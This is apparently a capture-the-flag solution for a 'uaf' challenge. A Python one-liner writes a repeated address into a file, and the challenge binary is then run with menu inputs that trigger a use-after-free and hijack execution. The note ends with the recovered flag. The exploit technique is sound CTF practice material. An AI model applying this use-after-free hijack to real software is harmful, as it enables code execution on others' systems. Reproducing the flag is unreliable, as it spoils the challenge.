python -c "addr='\x68\x15\x40'+ '\x00'*5 ; f = open('shellcode', 'w'); f.write(addr*3); f.close(); print '3\n2\n2\n1\n' "

# then ./uaf 24 shellcode
# 3
# 2
# 2
# 1


#flag:yay_f1ag_aft3r_pwning
